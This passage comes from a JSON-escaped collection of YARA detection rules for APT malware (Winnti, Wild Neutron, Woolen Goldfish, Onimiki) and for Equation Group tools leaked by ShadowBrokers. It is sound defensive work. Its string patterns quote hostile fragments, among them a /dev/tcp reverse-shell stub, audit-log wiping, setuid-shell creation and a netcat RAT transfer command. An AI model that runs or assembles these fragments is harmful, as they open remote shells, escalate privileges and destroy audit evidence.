\"%SYSTEMROOT%\\\\System32\\\\dpcore16t.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */\n        $s4 = \"%SYSTEMROOT%\\\\System32\\\\wdigestEx.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */\n        $s5 = \"%SYSTEMROOT%\\\\System32\\\\mspool.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */\n        $s6 = \"%SYSTEMROOT%\\\\System32\\\\kernel32.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n        $s7 = \"%SYSTEMROOT%\\\\SysWOW64\\\\iastor32.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */\n        $s8 = \"%SYSTEMROOT%\\\\System32\\\\msvcse.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */\n        $s9 = \"%SYSTEMROOT%\\\\System32\\\\mshtaex.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */\n        $s10 = \"%SYSTEMROOT%\\\\System32\\\\iastor32.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */\n        $s11 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mshtaex.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */\n        $x1 = \"wdigestEx.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00' */\n        $x2 = \"dpcore16t.dll\" fullword ascii /* score: '21.00' */\n        $x3 = \"mspool.dll\" fullword ascii /* score: '21.00' */\n        $x4 = \"msvcse.exe\" fullword ascii /* score: '20.00' */\n        $x5 = \"mshtaex.exe\" fullword wide /* score: '20.00' */\n        $x6 = \"iastor32.exe\" fullword ascii /* score: '20.00' */\n        $y1 = \"Installer.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00' */\n        $y2 = \"Info: Process %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00' */\n        $y3 = \"Error: GetFileTime %s 0x%x\" fullword ascii /* score: '17.00' */\n        $y4 = \"Install succeeded\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */\n        $y5 = \"Error: RegSetValueExA 0x%x\" fullword ascii /* score: '9.00' */\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and ( $n1 or ( 1 of ($s*) and 1 of ($x*) and 3 of ($y*)))\n}",
  "WildNeutron_javacpl": "rule WildNeutron_javacpl \n{\n\n    meta:\n        description = \"Wild Neutron APT Sample Rule - from files 683f5b476f8ffe87ec22b8bab57f74da4a13ecc3a5c2cbf951999953c2064fc9, 758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92, 8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        date = \"2015-07-10\"\n        score = 60\n        super_rule = 1\n        hash1 = \"683f5b476f8ffe87ec22b8bab57f74da4a13ecc3a5c2cbf951999953c2064fc9\"\n        hash2 = \"758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92\"\n        hash3 = \"8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a\"\n   \n    strings:\n        $x1 = \"javacpl.exe\" fullword wide /* score: '3.00' */ /* Goodware String - occured 2 times */\n        $s0 = \"RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00' */\n        $s1 = \"Error executing CreateProcess()!!\" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00' */\n        $s2 = \"http://www.java.com/en/download/installed.jsp?detect=jre\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */\n        $s3 = \"RunFile: couldn't load SHELL32.DLL!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */\n        $s4 = \"Process is not running any more\" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00' */\n        $s6 = \"Windows NT Version %lu.%lu\" fullword wide /* PEStudio Blacklist: os */ /* score: '19.00' */\n        $s7 = \"Usage: destination [reference]\" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */\n        $s8 = \"Invalid input handle!!!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n        $s9 = \".com;.exe;.bat;.cmd\" fullword wide /* score: '15.00' */\n        $s10 = \") -%s-> %s (\" fullword ascii /* score: '14.00' */\n        $s11 = \"cmdextversion\" fullword wide /* score: '14.00' */\n        $s12 = \"Invalid pid (%s)\" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00' */\n        $s13 = \"\\\"%s\\\" /K %s\" fullword wide /* score: '11.02' */\n        $s14 = \"Error setting %s (%s)\" fullword wide /* score: '11.00' */\n        $s16 = \"cmdcmdline\" fullword wide /* score: '11.00' */\n        $s39 = \"2008R2\" fullword ascii /* PEStudio Blacklist: os */ /* score: '8.00' */\n  \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1677KB and all of them\n}",
  "onimiki": "rule onimiki\n{\n\n  meta:\n    description = \"Linux/Onimiki malicious DNS server\"\n    malware = \"Linux/Onimiki\"\n    operation = \"Windigo\"\n    author = \"Olivier Bilodeau <bilodeau@eset.com>\"\n    created = \"2014-02-06\"\n    reference = \"http://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf\"\n    contact = \"windigo@eset.sk\"\n    source = \"https://github.com/eset/malware-ioc/\"\n    license = \"BSD 2-Clause\"\n\n  strings:\n    // code from offset: 0x46CBCD\n    $a1 = {43 0F B6 74 2A 0E 43 0F  B6 0C 2A 8D 7C 3D 00 8D}\n    $a2 = {74 35 00 8D 4C 0D 00 89  F8 41 F7 E3 89 F8 29 D0}\n    $a3 = {D1 E8 01 C2 89 F0 C1 EA  04 44 8D 0C 92 46 8D 0C}\n    $a4 = {8A 41 F7 E3 89 F0 44 29  CF 29 D0 D1 E8 01 C2 89}\n    $a5 = {C8 C1 EA 04 44 8D 04 92  46 8D 04 82 41 F7 E3 89}\n    $a6 = {C8 44 29 C6 29 D0 D1 E8  01 C2 C1 EA 04 8D 04 92}\n    $a7 = {8D 04 82 29 C1 42 0F B6  04 21 42 88 84 14 C0 01}\n    $a8 = {00 00 42 0F B6 04 27 43  88 04 32 42 0F B6 04 26}\n    $a9 = {42 88 84 14 A0 01 00 00  49 83 C2 01 49 83 FA 07}\n\n  condition:\n    all of them\n}",
  "Winnti_signing_cert": "rule Winnti_signing_cert \n{\n\n    meta:\n        description = \"Detects a signing certificate used by the Winnti APT group\"\n        author = \"Florian Roth\"\n        reference = \"https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/\"\n        date = \"2015-10-10\"\n        score = 75\n        hash1 = \"a9a8dc4ae77b1282f0c8bdebd2643458fc1ceb3145db4e30120dd81676ff9b61\"\n        hash2 = \"9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672\"\n\n    strings:\n        $s1 = \"Guangzhou YuanLuo Technology Co.\" ascii\n        $s2 = \"Guangzhou YuanLuo Technology Co.,Ltd\" ascii\n        $s3 = \"$Asahi Kasei Microdevices Corporation0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and 1 of them\n}",
  "Winnti_malware_Nsiproxy": "rule Winnti_malware_Nsiproxy \n{\n\n    meta:\n        description = \"Detects a Winnti rootkit\"\n        author = \"Florian Roth\"\n        date = \"2015-10-10\"\n        score = 75\n        hash1 = \"9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672\"\n        hash2 = \"cf1e006694b33f27d7c748bab35d0b0031a22d193622d47409b6725b395bffb0\"\n        hash3 = \"326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e\"\n        hash4 = \"aff7c7478fe33c57954b6fec2095efe8f9edf5cdb48a680de9439ba62a77945f\"\n        hash5 = \"ba7ccd027fd2c826bbe8f2145d5131eff906150bd98fe25a10fbee2c984df1b8\"\n   \n    strings:\n        $x1 = \"\\\\Driver\\\\nsiproxy\" fullword wide\n        $a1 = \"\\\\Device\\\\StreamPortal\" fullword wide\n        $a2 = \"\\\\Device\\\\PNTFILTER\" fullword wide\n        $s1 = \"Cookie: SN=\" fullword ascii\n        $s2 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" fullword wide\n        $s3 = \"Winqual.sys\" fullword wide\n        $s4 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\" fullword wide\n        $s5 = \"http://www.wasabii.com.tw 0\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and $x1 and 1 of ($a*) and 2 of ($s*)\n}",
  "Winnti_malware_UpdateDLL": "rule Winnti_malware_UpdateDLL \n{\n\n    meta:\n        description = \"Detects a Winnti malware - Update.dll\"\n        author = \"Florian Roth\"\n        reference = \"VTI research\"\n        date = \"2015-10-10\"\n        score = 75\n        hash1 = \"1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016\"\n        hash2 = \"50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a\"\n        hash3 = \"6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58\"\n        hash4 = \"50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a\"\n   \n    strings:\n        $c1 = \"'Wymajtec$Tima Stempijg Sarviges GA -$G2\" fullword ascii\n        $c2 = \"AHDNEAFE1.sys\" fullword ascii\n        $c3 = \"SOTEFEHJ3.sys\" fullword ascii\n        $c4 = \"MainSYS64.sys\" fullword ascii\n        $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword wide\n        $s2 = \"Update.dll\" fullword ascii\n        $s3 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n        $s4 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n        $s5 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" fullword wide\n        $s6 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n        $s7 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n        $s8 = \"HOST: %s\" fullword ascii\n        $s9 = \"$$$--Hello\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and ( ( 1 of ($c*) and 3 of ($s*) ) or all of ($s*) )\n}",
  "Winnti_malware_FWPK": "rule Winnti_malware_FWPK \n{\n\n    meta:\n        description = \"Detects a Winnti malware - FWPKCLNT.SYS\"\n        author = \"Florian Roth\"\n        reference = \"VTI research\"\n        date = \"2015-10-10\"\n        score = 75\n        hash1 = \"1098518786c84b0d31f215122275582bdcd1666653ebc25d50a142b4f5dabf2c\"\n        hash2 = \"9a684ffad0e1c6a22db1bef2399f839d8eff53d7024fb014b9a5f714d11febd7\"\n        hash3 = \"a836397817071c35e24e94b2be3c2fa4ffa2eb1675d3db3b4456122ff4a71368\"\n  \n    strings:\n        $s0 = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\\\\" fullword wide\n        $s1 = \"%x:%d->%x:%d, Flag %s%s%s%s%s, seq %u, ackseq %u, datalen %u\" fullword ascii\n        $s2 = \"FWPKCLNT.SYS\" fullword ascii\n        $s3 = \"Port Layer\" fullword wide\n        $s4 = \"%x->%x, icmp type %d, code %d\" fullword ascii\n        $s5 = \"\\\\BaseNamedObjects\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28E}\" fullword wide\n        $s6 = \"\\\\Ndi\\\\Interfaces\" fullword wide\n        $s7 = \"\\\\Device\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}\" fullword wide\n        $s8 = \"Bad packet\" fullword ascii\n        $s9 = \"\\\\BaseNamedObjects\\\\EKV0000000000\" fullword wide\n        $s10 = \"%x->%x\" fullword ascii\n        $s11 = \"IPInjectPkt\" fullword ascii /* Goodware String - occured 6 times */\n \n    condition:\n        uint16(0) == 0x5a4d and filesize < 642KB and all of them\n}",
  "Winnti_malware_StreamPortal_Gen": "rule Winnti_malware_StreamPortal_Gen \n{\n\n    meta:\n        description = \"Detects a Winnti malware - Streamportal\"\n        author = \"Florian Roth\"\n        reference = \"VTI research\"\n        date = \"2015-10-10\"\n        score = 75\n        hash1 = \"326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e\"\n        hash2 = \"9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672\"\n        hash3 = \"aff7c7478fe33c57954b6fec2095efe8f9edf5cdb48a680de9439ba62a77945f\"\n  \n    strings:\n        $s0 = \"Proxies destination address/port for TCP\" fullword wide\n        $s3 = \"\\\\Device\\\\StreamPortal\" fullword wide\n        $s4 = \"Transport-Data Proxy Sub-Layer\" fullword wide\n        $s5 = \"Cookie: SN=\" fullword ascii\n        $s6 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" fullword wide\n        $s17 = \"NTOSKRNL.EXE\" fullword wide /* Goodware String - occured 4 times */\n        $s19 = \"FwpsReferenceNetBufferList0\" fullword ascii /* Goodware String - occured 5 times */\n  \n    condition:\n        uint16(0) == 0x5a4d and filesize < 275KB and all of them\n}",
  "WinntiPharma": "rule WinntiPharma \n{\n\nmeta:\n    author = \"Jose Ramon Palanco\"\n    copyright = \"Drainware, Inc.\"\n    date = \"2015-06-23\"\n    description = \"Backdoor Win64 Winnti Pharma\"\n    ref = \"https://securelist.com/blog/research/70991/games-are-over/\"\n\nstrings:\n    $s0 = \"Cookie: SN=\"\n    $s1 = \"{3ec05b4a-ea88-1378-3389-66706ba27600}\"\n    $s2 = \"{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n    $s3 = \"master secret\"\n    $s4 = \"MyEngineNetEvent\"\n\ncondition:\n    all of ($s*)\n}",
  "WoolenGoldfish_Sample_1": "rule WoolenGoldfish_Sample_1 \n{\n\n    meta:\n        description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/NpJpVZ\"\n        date = \"2015/03/25\"\n        score = 60\n        hash = \"7ad0eb113bc575363a058f4bf21dbab8c8f7073a\"\n    \n    strings:\n        $s1 = \"Cannot execute (%d)\" fullword ascii\n        $s16 = \"SvcName\" fullword ascii\n    \n    condition:\n        all of them\n}",
  "WoolenGoldfish_Generic_1": "rule WoolenGoldfish_Generic_1 \n{\n\n    meta:\n        description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/NpJpVZ\"\n        date = \"2015/03/25\"\n        score = 90\n        super_rule = 1\n        hash0 = \"5d334e0cb4ff58859e91f9e7f1c451ffdc7544c3\"\n        hash1 = \"d5b2b30fe2d4759c199e3659d561a50f88a7fb2e\"\n        hash2 = \"a42f1ad2360833baedd2d5f59354c4fc3820c475\"\n    \n    strings:\n        $x0 = \"Users\\\\Wool3n.H4t\\\\\"\n        $x1 = \"C-CPP\\\\CWoolger\"\n        $x2 = \"NTSuser.exe\" fullword wide\n        $s1 = \"107.6.181.116\" fullword wide\n        $s2 = \"oShellLink.Hotkey = \\\"CTRL+SHIFT+F\\\"\" fullword\n        $s3 = \"set WshShell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword\n        $s4 = \"oShellLink.IconLocation = \\\"notepad.exe, 0\\\"\" fullword\n        $s5 = \"set oShellLink = WshShell.CreateShortcut(strSTUP & \\\"\\\\WinDefender.lnk\\\")\" fullword\n        $s6 = \"wlg.dat\" fullword\n        $s7 = \"woolger\" fullword wide\n        $s8 = \"[Enter]\" fullword\n        $s9 = \"[Control]\" fullword\n    condition:\n        ( 1 of ($x*) and 2 of ($s*) ) or ( 6 of ($s*) )\n}",
  "WoolenGoldfish_Generic_2": "rule WoolenGoldfish_Generic_2 \n{\n\n    meta:\n        description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/NpJpVZ\"\n        date = \"2015/03/25\"\n        score = 90\n        hash1 = \"47b1c9caabe3ae681934a33cd6f3a1b311fd7f9f\"\n        hash2 = \"62172eee1a4591bde2658175dd5b8652d5aead2a\"\n        hash3 = \"7fef48e1303e40110798dfec929ad88f1ad4fbd8\"\n        hash4 = \"c1edf6e3a271cf06030cc46cbd90074488c05564\"\n   \n    strings:\n        $s0 = \"modules\\\\exploits\\\\littletools\\\\agent_wrapper\\\\release\" ascii\n   \n    condition:\n        all of them\n}",
  "WoolenGoldfish_Generic_3": "rule WoolenGoldfish_Generic_3 \n{\n\n    meta:\n        description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/NpJpVZ\"\n        date = \"2015/03/25\"\n        score = 90\n        hash1 = \"86222ef166474e53f1eb6d7e6701713834e6fee7\"\n        hash2 = \"e8dbcde49c7f760165ebb0cb3452e4f1c24981f5\"\n    \n    strings:\n        $x1 = \"... get header FATAL ERROR !!!  %d bytes read > header_size\" fullword ascii\n        $x2 = \"index.php?c=%S&r=%x&u=1&t=%S\" fullword wide\n        $x3 = \"connect_back_tcp_channel#do_connect:: Error resolving connect back hostname\" fullword ascii\n        $s0 = \"kernel32.dll GetProcAddressLoadLibraryAws2_32.dll\" fullword ascii\n        $s1 = \"Content-Type: multipart/form-data; boundary=%S\" fullword wide\n        $s2 = \"Attempting to unlock uninitialized lock!\" fullword ascii\n        $s4 = \"unable to load kernel32.dll\" fullword ascii\n        $s5 = \"index.php?c=%S&r=%x\" fullword wide\n        $s6 = \"%s len:%d \" fullword ascii\n        $s7 = \"Encountered error sending syscall response to client\" fullword ascii\n        $s9 = \"/info.dat\" fullword ascii\n        $s10 = \"Error entering thread lock\" fullword ascii\n        $s11 = \"Error exiting thread lock\" fullword ascii\n        $s12 = \"connect_back_tcp_channel_init:: socket() failed\" fullword ascii\n   \n    condition:\n        ( 1 of ($x*) ) or ( 8 of ($s*) )\n}",
  "EquationGroup_emptycriss": "rule EquationGroup_emptycriss {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file emptycriss\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"a698d35a0c4d25fd960bd40c1de1022bb0763b77938bf279e91c9330060b0b91\"\n   strings:\n      $s1 = \"./emptycriss <target IP>\" fullword ascii\n      $s2 = \"Cut and paste the following to the telnet prompt:\" fullword ascii\n      $s8 = \"environ define TTYPROMPT abcdef\" fullword ascii\n   condition:\n      ( filesize < 50KB and 1 of them )\n}",
  "EquationGroup_scripme": "rule EquationGroup_scripme {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file scripme\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"a1adf1c1caad96e7b7fd92cbf419c4cfa13214e66497c9e46ec274a487cd098a\"\n   strings:\n      $x1 = \"running \\\\\\\"tcpdump -n -n\\\\\\\", on the environment variable \\\\$INTERFACE, scripted\" fullword ascii\n      $x2 = \"Cannot read $opetc/scripme.override -- are you root?\" ascii\n      $x3 = \"$ENV{EXPLOIT_SCRIPME}\" ascii\n      $x4 = \"$opetc/scripme.override\" ascii\n   condition:\n      ( filesize < 30KB and 1 of them )\n}",
  "EquationGroup_cryptTool": "rule EquationGroup_cryptTool {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cryptTool\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"96947ad30a2ab15ca5ef53ba8969b9d9a89c48a403e8b22dd5698145ac6695d2\"\n   strings:\n      $s1 = \"The encryption key is \" fullword ascii\n      $s2 = \"___tempFile2.out\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 200KB and all of them )\n}",
  "EquationGroup_dumppoppy": "rule EquationGroup_dumppoppy {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file dumppoppy\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"4a5c01590063c78d03c092570b3206fde211daaa885caac2ab0d42051d4fc719\"\n   strings:\n      $x1 = \"Unless the -c (clobber) option is used, if two RETR commands of the\" fullword ascii\n      $x2 = \"mywarn(\\\"End of $destfile determined by \\\\\\\"^Connection closed by foreign host\\\\\\\"\\\")\" fullword ascii\n\n      $l1 = \"End of $destfile determined by \\\"^Connection closed by foreign host\"\n   condition:\n      ( filesize < 20KB and 1 of them )\n}",
  "EquationGroup_Auditcleaner": "rule EquationGroup_Auditcleaner {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"8c172a60fa9e50f0df493bf5baeb7cc311baef327431526c47114335e0097626\"\n   strings:\n      $x1 = \"> /var/log/audit/audit.log; rm -f .\" ascii\n      $x2 = \"Pastables to run on target:\" ascii\n      $x3 = \"cp /var/log/audit/audit.log .tmp\" ascii\n\n      $l1 = \"Here is the first good cron session from\" fullword ascii\n      $l2 = \"No need to clean LOGIN lines.\" fullword ascii\n   condition:\n      ( filesize < 300KB and 1 of them )\n}",
  "EquationGroup_reverse_shell": "rule EquationGroup_reverse_shell {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"d29aa24e6fb9e3b3d007847e1630635d6c70186a36c4ab95268d28aa12896826\"\n   strings:\n      $s1 = \"sh >/dev/tcp/\" ascii\n      $s2 = \" <&1 2>&1\" fullword ascii\n   condition:\n      ( filesize < 1KB and all of them )\n}",
  "EquationGroup_tnmunger": "rule EquationGroup_tnmunger {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file tnmunger\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"1ab985d84871c54d36ba4d2abd9168c2a468f1ba06994459db06be13ee3ae0d2\"\n   strings:\n      $s1 = \"TEST: mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n      $s2 = \"mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 10KB and 1 of them )\n}",
  "EquationGroup_ys_ratload": "rule EquationGroup_ys_ratload {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"a340e5b5cfd41076bd4d6ad89d7157eeac264db97a9dddaae15d935937f10d75\"\n   strings:\n      $x1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\\\"\" fullword ascii\n      $x2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n      $x3 = \"CALLBACK_PORT=32177\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 3KB and 1 of them )\n}",
  "EquationGroup_eh_1_1_0": "rule EquationGroup_eh_1_1_0 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"0f8dd094516f1be96da5f9addc0f97bcac8f2a348374bd9631aa912344559628\"\n   strings:\n      $x1 = \"usage: %s -e -v -i target IP [-c Cert File] [-k Key File]\" fullword ascii\n      $x2 = \"TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=\" ascii\n      $x3 = \"[-l Log File] [-m save MAC time file(s)] [-p Server Port]\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_evolvingstrategy_1_0_1": "rule EquationGroup_evolvingstrategy_1_0_1 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"fe70e16715992cc86bbef3e71240f55c7d73815b4247d7e866c845b970233c1b\"\n   strings:\n      $s1 = \"chown root sh; chmod 4777 sh;\" fullword ascii\n      $s2 = \"cp /bin/sh .;chown root sh;\" fullword ascii\n\n      $l1 = \"echo clean up when elevated:\" fullword ascii\n\n      $x1 = \"EXE=$DIR/sbin/ey_vrupdate\" fullword ascii\n   condition:\n      ( filesize < 4KB and 1 of them )\n}",
  "EquationGroup_toast_v3_2_0": "rule EquationGroup_toast_v3_2_0 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"2ce2d16d24069dc29cf1464819a9dc6deed38d1e5ffc86d175b06ddb691b648b\"\n   strings:\n      $x2 = \"Del --- Usage: %s -l file -w wtmp -r user\" fullword ascii\n      $s5 = \"Roasting ->%s<- at ->%d:%d<-\" fullword ascii\n      $s6 = \"rbnoil -Roasting ->\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 50KB and 1 of them )\n}",
  "EquationGroup_sshobo": "rule EquationGroup_sshobo {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file sshobo\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"c7491898a0a77981c44847eb00fb0b186aa79a219a35ebbca944d627eefa7d45\"\n   strings:\n      $x1 = \"Requested forwarding of port %d but user is not root.\" fullword ascii\n      $x2 = \"internal error: we do not read, but chan_read_failed for istate\" fullword ascii\n      $x3 = \"~#  - list forwarded connections\" fullword ascii\n      $x4 = \"packet_inject_ignore: block\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 600KB and all of them )\n}",
  "EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0": "rule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1\"\n   strings:\n      $x1 = \"result = self.send_command(\\\"ls -al %s\\\" % self.options.DIR)\" fullword ascii\n      $x2 = \"cmd += \\\"D=-l%s \\\" % self.options.LISTEN_PORT\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 80KB and 1 of them )\n}",
  "EquationGroup_packrat": "rule EquationGroup_packrat {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file packrat\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"d3e067879c51947d715fc2cf0d8d91c897fe9f50cae6784739b5c17e8a8559cf\"\n   strings:\n      $x2 = \"Use this on target to get your RAT:\" fullword ascii\n      $x3 = \"$ratremotename && \" fullword ascii\n      $x5 = \"$command = \\\"$nc$bindto -vv -l -p $port < ${ratremotename}\\\" ;\" fullword ascii\n   condition:\n      ( filesize < 70KB and 1 of them )\n}",
  "EquationGroup_telex": "rule EquationGroup_telex {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file telex\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      hash1 = \"e9713b15fc164e0f64783e7a2eac189a40e0a60e2268bd7132cfdc624dfe54ef\"\n   strings:\n      $x1 = \"usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>\" fullword ascii\n      $x2 = \"target is not vulnerable. exiting\" fullword ascii\n      $s3 = \"Sending final buffer: evil_blocks and shellcode...\" fullword ascii\n      $s4 = \"Timeout waiting for daemon to die.  Exploit probably failed.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 50KB and 1 of them )\n}",
